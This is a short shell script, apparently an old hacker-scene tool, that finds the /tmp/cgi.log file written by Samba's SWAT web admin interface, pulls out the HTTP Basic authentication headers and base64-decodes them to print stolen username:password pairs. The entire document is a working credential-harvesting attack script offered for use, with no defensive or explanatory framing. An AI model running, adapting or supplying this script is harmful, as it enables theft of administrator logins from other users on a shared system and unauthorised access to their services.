#!/bin/sh
# phear my ugly shell scripting! - miah@uberhax0r.net
# grabs username:password from swat cgi.log, then decodes 
# and outputs the results.
clear
echo "######################"
echo "#checking for cgi.log#"
echo "######################"
echo
 if [ -f /tmp/cgi.log ]
  then
	echo " - cgi.log found"
	echo " - extracting logins"
	echo
	grep "Basic" /tmp/cgi.log|awk '{print $3}' > /tmp/encoded.cgi.log
	sort /tmp/encoded.cgi.log > /tmp/encoded.cgi.log.1
	uniq /tmp/encoded.cgi.log.1 > /tmp/uniq.cgi.log
	rm /tmp/encoded.cgi.log*
	for i in $( cat /tmp/uniq.cgi.log ); do
		echo $i 012| mmencode -u
		echo
	done	
	rm /tmp/uniq.cgi.log
  else
	echo " - cgi.log not found!" 
fi
